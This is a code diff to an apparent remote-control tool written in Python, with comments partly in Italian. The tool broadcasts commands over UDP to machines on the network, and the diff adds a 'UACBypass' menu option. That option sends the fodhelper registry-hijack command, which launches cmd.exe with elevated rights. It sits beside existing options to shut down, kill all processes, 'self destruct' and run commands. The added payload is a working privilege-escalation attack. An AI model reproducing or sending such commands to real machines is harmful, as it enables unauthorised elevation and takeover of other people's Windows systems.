@@ -274,6 +274,14 @@ while True:
                 sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
                 show_message("Command Executed", 3)
 
+            def UACBypass():
+                  
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
+                message = 'reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe'
+                sock.sendto(message.encode('utf-8'), (BROADCAST_IP, PORT))
+                show_message("Command Executed", 3)
+
 
             def Terminal():
                 """Invia un comando PowerShell per uccidere tutti i processi tranne explorer."""
@@ -297,7 +305,7 @@ while True:
                 except Exception as e:
                     show_message("--- ERROR --", 3)
 
-            sub_menu_options = ["Shutdown", "Reboot", "RickRoll", "Kill All Process", "SELF DESTRUCTION", "Cmd", "Exit"]
+            sub_menu_options = ["Shutdown", "Reboot", "RickRoll", "Kill All Process", "SELF DESTRUCTION", "UACBypass", "Cmd", "Exit"]
             sub_selected_index = 0
 
 
@@ -329,6 +337,8 @@ while True:
 
                     if sub_selected_option == "Kill All Process":
                         KillEmAll() # Metallica Reference?!
+                    if sub_selected_option == "UACBypass":
+                        UACBypass() # Metallica Reference?!
                     if sub_selected_option == "Exit":
                         break
 
